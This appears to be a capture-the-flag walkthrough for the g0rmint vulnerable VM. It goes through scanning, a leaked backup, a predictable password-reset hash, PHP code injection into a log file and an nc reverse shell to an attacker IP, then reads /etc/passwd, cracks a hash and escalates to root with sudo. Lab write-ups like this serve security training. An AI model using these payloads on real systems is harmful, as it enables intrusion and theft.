@@ -1,0 +1,247 @@
+$ netdiscover -i wlp2s0
+192.168.1.9
+
+$ nmap -sV 192.168.1.9 -p- -Pn -T5
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+$ nikto -h http://192.168.1.9
+
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x2e 0x55cfff84153c0 
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 5 item(s) reported on remote h
+
+let's checkout http://192.168.1.9/robots.txt
+
+/* Too easy? Lets see */
+Disallow: /g0rmint/*
+
+let's see http://192.168.1.9/g0rmint
+
+# It redirects to http://192.168.1.9/g0rmint/login.php
+
+when we check out the source code
+   <!-- start: Mobile Specific -->
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="backup-directory" content="s3cretbackupdirect0ry">
+        <!-- end: Mobile Specific -->
+		
+		there is an entry like this
+
+as you see it says s3cretbackupdirect0ry
+
+a secret backup directory
+
+http://192.168.1.9/g0rmint/s3cretbackupdirect0ry/
+
+says that not found
+
+let's use dirb to see if it contains anything
+
+$ dirb http://192.168.1.9/g0rmint/s3cretbackupdirect0ry/
+
+http://192.168.1.9/g0rmint/s3cretbackupdirect0ry/info.php (CODE:200|SIZE:11)
+
+
+dirbs says that it has a file info.php
+
+lets check out the directory
+
+http://192.168.1.9/g0rmint/s3cretbackupdirect0ry/info.php
+backup.zip
+
+lets check if it has backup.zip file 
+
+http://192.168.1.9/g0rmint/s3cretbackupdirect0ry/backup.zip
+
+and download the file
+
+when we unzip the file we see a bunch of files
+
+one of them is reset.php which explains the reset password function
+
+$password = substr(hash('sha1', gmdate("l jS \of F Y h:i:s A")), 0, 20);
+
+all we need is email and username and the date that the program is being uxecuted
+
+when we have this three we can have the password
+
+on the http://192.168.1.9/g0rmint/reset.php there is a time showing the time 
+that the function is executed
+
+after wandering around I found the name and mail in the style.css
+
+uthor: noman
+* Author Email: w3bdrill3r@gmail.com
+* Version: 1.0.0
+* g0rmint: Bik gai hai
+* Copyright: Aunty g0rmint
+* www: http://g0rmint.com
+* Site managed and developed by author himself
+
+now we will run the script on our terminal and get the password
+
+now go to 
+http://192.168.1.9/g0rmint/reset.php
+type the email and username and reset the password and get the time
+
+Thursday 14th of May 2020 09:08:03 PM
+
+now open the terminal and type php -a to have an interactive php shell
+
+then type $password = substr(hash("sha1", "Thursday 14th of May 2020 09:08:03 PM")), 0, 20);
+
+>>echo $password
+1a7de9bd05a7eba4e939
+
+we got the password, now go to login.php and type the credentials
+
+and we are in
+
+since we have all the source code we can see what files end what endpoints the 
+site has
+
+there is a secretlogfile.php endpoint 
+http://192.168.1.9/g0rmint/secretlogfile.php  as wee see it it logs the 
+false credential attempts. the file is in .php which means if we can write 
+php code inside the file, we can execute it as well
+
+the writing function is inside config.php
+
+<?php
+
+$dsn = 'mysql:dbname=g0rmint;host=localhost';
+$pdo = new PDO($dsn, 'root', '');
+$rooturl = "http://" . $_SERVER['SERVER_NAME'] . "/g0rmint/";
+if (isset($_POST)) {
+    foreach ($_POST as $key => $value) {
+        if (!is_array($value)) {
+            $value = addslashes($value);
+        }
+
+        $_POST[$key] = $value;
+    }
+}
+
+function addlog($log, $reason) {
+    $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php";
+    if (file_exists($myFile)) {
+        $fh = fopen($myFile, 'a');
+        fwrite($fh, $reason . $log . "<br>\n");
+    } else {
+        $fh = fopen($myFile, 'w');
+        fwrite($fh, file_get_contents("dummy.php") . "<br>\n");
+        fclose($fh);
+        $fh = fopen($myFile, 'a');
+        fwrite($fh, $reason . $log . "<br>\n");
+    }
+    fclose($fh);
+}
+
+it simply writes the false login attempt to the file
+
+but before it it uses addslashes function to make sure that single and double
+quotes are escaped
+
+so our payload should not have any of those.
+
+first to see if it works  <?php echo `ls`;?> type it in email
+
+and login the correct credentials and go to secretlogfile.php to see if its 
+executed
+
+Failed login attempt detected with email: 2020-05-14.php 2020-05-15.php 
+
+yes it has been executed 
+
+now we will get a revershe shell
+
+our new payload is 
+now set up a listener on local host
+
+nc -lnvp 4444
+
+
+<?php echo `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.12 4444 >/tmp/f`; ?>
+
+execute this payload by going to secretlogfile.php
+
+and we got the reverse shell
+
+lets look at the /etc/passwd file
+
+$ cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+g0rmint:x:1000:1000:Noman Riffat,,,:/home/g0rmint:/bin/bash
+mysql:x:108:117:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+
+there is a system user g0rmint
+
+#in /var/www directory there is a backup.zip file , I unzipped it and found 
+a hash in db.sql and decided to use it as g0rmint user's password
+
+$ unzip backup.zip -d /tmp/data
+
+$ cat db.sql
+
+INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
+(1, 'noman', 'w3bdrill3r@gmail.com', 'ea60b43e48f3c2de55e4fc89b3da53dc');
+
+I cracked it online and it was "tayyab123"
+
+and used it to login ssh
+
+$ ssh -l g0rmint 192.168.1.9
+
+and it worked
+
+$ sudo -l
+Matching Defaults entries for g0rmint on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User g0rmint may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+
+$ sudo -s
+and we are root
+
+$ cat /root/flag.txt
+
+Congrats you did it :)
+Give me feedback @nomanriffat
